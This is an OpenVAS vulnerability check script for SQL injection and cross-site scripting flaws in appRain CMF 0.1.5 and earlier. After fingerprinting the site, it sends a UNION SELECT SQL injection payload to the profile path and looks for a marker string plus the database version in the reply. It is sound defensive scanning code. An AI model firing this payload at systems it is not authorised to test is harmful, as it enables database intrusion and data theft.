##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_apprain_sql_and_xss_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
#
# appRain CMF SQL Injection And Cross Site Scripting Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902690");
  script_version("$Revision: 11374 $");
  script_cve_id("CVE-2011-5228", "CVE-2011-5229");
  script_bugtraq_id(51105);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-10-29 16:47:00 +0530 (Mon, 29 Oct 2012)");
  script_name("appRain CMF SQL Injection And Cross Site Scripting Vulnerabilities");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/71880");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/71881");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18249/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"insight", value:"Multiple flaws are due to an input passed via

  - 'PATH_INFO' to quickstart/profile/index.php in the Forum module is not
  properly sanitized before being used in a SQL query.

  - 'ss' parameter in 'search' action is not properly verified before it is
  returned to the user.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running appRain CMF and is prone to sql injection
  and cross site scripting vulnerabilities.");
  script_tag(name:"impact", value:"Successful exploitation will allow the attackers to execute
  arbitrary web script or HTML in a user's browser session in the context of
  an affected site and manipulate SQL queries by injecting arbitrary SQL code.");
  script_tag(name:"affected", value:"appRain CMF version 0.1.5 and prior");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

rainPort = get_http_port(default:80);

if(!can_host_php(port:rainPort)){
  exit(0);
}

foreach dir (make_list_unique("/appRain", "/apprain", "/", cgi_dirs(port:rainPort)))
{

  if(dir == "/") dir = "";
  url = dir + "/profile/index.php";

  if(http_vuln_check(port:rainPort, url:url, pattern:"Start with appRain<",
                 check_header:TRUE, extra_check:make_list('>Profile','>Login')))
  {
    url = dir + "/profile/-1%20union%20all%20select%201,2,3,CONCAT" +
          "(0x6f762d73716c2d696e6a2d74657374,0x3a,@@version,0x3a,0x6f762d7"+
          "3716c2d696e6a2d74657374),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--";

    if(http_vuln_check(port:rainPort, url:url, pattern:"ov-sql-inj-test:[0-9]+.*:" +
                       "ov-sql-inj-test", check_header:TRUE,
                       extra_check:make_list('>Profile','Start with appRain<')))
    {
      security_message(port:rainPort);
      exit(0);
    }
  }
}

exit(99);